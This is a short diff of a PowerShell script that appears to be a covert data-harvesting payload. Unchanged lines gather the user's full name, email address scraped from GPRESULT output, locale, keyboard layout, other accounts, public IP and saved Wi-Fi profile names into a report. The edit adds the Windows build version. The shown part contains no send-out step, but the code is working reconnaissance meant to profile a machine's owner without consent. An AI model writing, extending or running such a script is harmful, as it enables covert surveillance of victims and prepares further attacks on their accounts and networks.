@@ -4,7 +4,7 @@ $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.Full
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
-
+$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
@@ -36,6 +36,7 @@ Keyboard Layout : $keyboardLayoutID
 Other Accounts  : $users
 Public IP       : $computerPubIP
 Current OS      : $OSString
+Build           : $ver
 Hardware Info
 --------------------------------------------------------
 $systemString``"
